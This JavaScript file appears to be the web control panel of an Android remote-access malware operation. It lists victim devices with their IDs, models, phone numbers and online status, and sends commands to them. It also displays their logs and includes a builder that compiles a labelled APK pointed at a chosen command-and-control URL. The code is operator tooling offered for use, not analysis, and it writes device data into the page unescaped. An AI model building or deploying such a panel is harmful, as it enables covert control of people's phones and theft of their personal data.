// Consolidated Managers
const DevicesManager = {
    selectedDevices: [],
    async load() {
        const perPage = 20;
        const page = 1;
        const searchInput = document.getElementById('deviceSearch');
        const search = searchInput ? searchInput.value : '';
        try {
            const data = await API.getDevices(page, perPage, search);
            const tbody = document.getElementById('devicesTableBody');
            if (!tbody) return;
            tbody.innerHTML = '';
            if (!data.devices || data.devices.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:2rem; color:var(--text-dim)">No devices found</td></tr>';
                return;
            }
            data.devices.forEach(dev => {
                const isOnline = dev.online && (new Date() - new Date(dev.online) < 120000);
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td style="padding:1rem"><input type="checkbox" class="device-checkbox" value="${dev.android_id}" onchange="DevicesManager.updateSelection()"></td>
                    <td><code style="color:var(--accent); font-weight:700">${dev.android_id}</code></td>
                    <td>${dev.model || 'Unknown'}</td>
                    <td style="color:var(--text-dim)">${dev.phone_numbers || '-'}</td>
                    <td><span class="${isOnline ? 'status-online' : 'status-offline'}">● ${isOnline ? 'Online' : 'Offline'}</span></td>
                    <td><button onclick="showCommandModal('${dev.android_id}')" class="btn-primary" style="padding:0.35rem 0.75rem; font-size:0.75rem;">Command</button></td>
                `;
                tbody.appendChild(tr);
            });
        } catch (err) { console.error('Error:', err); }
    },
    updateSelection() {
        const checked = document.querySelectorAll('.device-checkbox:checked');
        this.selectedDevices = Array.from(checked).map(cb => cb.value);
        const btn = document.getElementById('sendCommandBtn');
        if (btn) btn.disabled = this.selectedDevices.length === 0;
    },
    selectAll() {
        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = true);
        this.updateSelection();
    },
    toggleSelectAll() {
        const master = document.getElementById('selectAllCheckbox');
        if (master) {
            document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = master.checked);
            this.updateSelection();
        }
    },
    filter() { this.load(); }
};

const LogsManager = {
    async load() {
        const searchInput = document.getElementById('logSearch');
        const search = searchInput ? searchInput.value : '';
        try {
            const data = await API.getLogs(search);
            const tbody = document.getElementById('logsTableBody');
            if (!tbody) return;
            tbody.innerHTML = '';
            data.logs.forEach(log => {
                const tr = document.createElement('tr');
                tr.innerHTML = `<td style="width:150px"><code>${log.android_id}</code></td><td>${log.log}</td><td style="width:180px;color:var(--text-dim)">${log.created_at}</td>`;
                tbody.appendChild(tr);
            });
        } catch (err) { console.error('Error:', err); }
    },
    filter() { this.load(); }
};

const DeviceCountManager = {
    async update() {
        try {
            const data = await API.getDeviceCount();
            const total = document.getElementById('deviceCount');
            const online = document.getElementById('onlineCount');
            const offline = document.getElementById('offlineCount');
            if (total) total.textContent = data.total;
            if (online) online.textContent = data.online;
            if (offline) offline.textContent = data.offline;
        } catch (err) { console.error('Error:', err); }
    }
};

const TabsManager = {
    switchTab(tab) {
        document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(div => div.classList.remove('active'));
        
        const btn = document.querySelector(`.tab-button[onclick*="'${tab}'"]`);
        if (btn) btn.classList.add('active');
        
        const content = document.getElementById(tab + '-tab');
        if (content) content.classList.add('active');
        
        if (tab === 'devices') DevicesManager.load();
        if (tab === 'logs') LogsManager.load();
    }
};

function buildApk() {
    const apkName = document.getElementById('apkName').value.trim();
    const appLabel = document.getElementById('appLabel').value.trim();
    const c2Url = document.getElementById('c2Url').value.trim();
    
    if (!c2Url) {
        alert('Please enter C2 URL');
        return;
    }
    
    const buildBtn = document.getElementById('buildBtn');
    const statusDiv = document.getElementById('buildStatus');
    const statusMsg = document.getElementById('statusMessage');
    const buildLog = document.getElementById('buildLog');
    const dinoSidebar = document.getElementById('dinoSidebar');
    
    buildBtn.disabled = true;
    statusDiv.style.display = 'block';
    statusMsg.textContent = 'Building... Play while you wait!';
    statusMsg.style.color = '#fff';
    buildLog.textContent = 'Starting Gradle build...\n';
    
    // Open Dino Sidebar
    dinoSidebar.classList.add('active');
    
    fetch('api/build.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ apkName, appLabel, c2Url })
    })
    .then(async res => {
        const text = await res.text();
        try { return JSON.parse(text); } catch(e) { throw new Error(text); }
    })
    .then(data => {
        buildBtn.disabled = false;
        buildLog.textContent = data.log || '';
        dinoSidebar.classList.remove('active');
        
        if (data.success) {
            statusMsg.textContent = 'Build successful! Downloading...';
            statusMsg.style.color = 'var(--success)';
            // Auto download
            const a = document.createElement('a');
            a.href = data.downloadUrl;
            a.download = data.downloadUrl;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        } else {
            statusMsg.textContent = 'Build failed.';
            statusMsg.style.color = 'var(--error)';
        }
    })
    .catch(err => {
        buildBtn.disabled = false;
        dinoSidebar.classList.remove('active');
        statusMsg.textContent = 'Error occurred.';
        buildLog.textContent += '\n' + err.message;
    });
}
